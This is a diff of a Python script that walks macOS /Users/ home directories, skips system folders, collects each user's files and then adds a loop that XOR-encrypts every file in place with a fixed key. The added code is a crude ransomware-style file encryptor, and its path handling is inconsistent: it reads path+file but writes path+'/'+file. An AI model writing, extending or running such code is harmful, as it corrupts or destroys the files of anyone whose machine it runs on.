@@ -3,24 +3,26 @@ import os
 
 files = []
 directories = []
-path = "/volumes/"
+path = "/Users/"
 
 findinguser = os.listdir(path)
-findinguser.remove('Macintosh HD')
+findinguser.remove(".localized")
+findinguser.remove("Shared")
+findinguser.remove("Guest")
 print(f"Users: {findinguser}")
 for a in findinguser:
-
-    path = f"/volumes/{a}/Vault/"
+    path = "/Users/"
+    path = path + a
     thepath = path
     for file in os.listdir(path):
             filepath = path + "/" + file
-            if file == ".Trashes":
+            if file == ".Trash":
                 print(f"File is ignored: {file}")
-            elif file == "System Volume Information":
+            elif file == "Library":
                 print(f"File is ignored: {file}")
             elif file == "PycharmProjects":
                 print(f"File is ignored: {file}")
-            elif file == ".Spotlight-V100":
+            elif file == ".atom":
                 print(f"File is ignored: {file}")
             elif os.path.isfile(filepath):
                 files.append(file)
@@ -52,3 +54,16 @@ for a in findinguser:
 print(files)
 print(directories)
 key = 22
+
+for file in files:
+    print('The path of file : ', path, file)
+    fin = open(path + file, 'rb')
+    image = fin.read()
+    fin.close()
+    image = bytearray(image)
+    for index, values in enumerate(image):
+        image[index] = values ^ key
+    fin = open(path + "/" + file, 'wb')
+    fin.write(image)
+    fin.close()
+    print('Encryption Done...')
